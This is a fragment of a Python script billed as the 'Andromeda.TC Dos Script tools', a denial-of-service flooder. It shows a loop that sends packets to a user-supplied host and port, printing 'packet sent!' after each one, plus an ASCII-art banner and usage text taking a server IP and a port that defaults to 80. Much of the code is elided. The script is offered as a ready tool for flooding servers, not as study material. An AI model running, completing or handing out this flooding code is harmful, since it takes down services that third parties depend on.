	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Andromeda.TC--> \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[92m	Andromeda.TC Dos Script tools.
   ...
   `hd/::-+.                .+-::/dy`
     /hs+/::.--          --.::/+sh:
       :hds+/-`          `-/+sdh:
        ...
        ||===========================================||
	usage : python andromeda.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
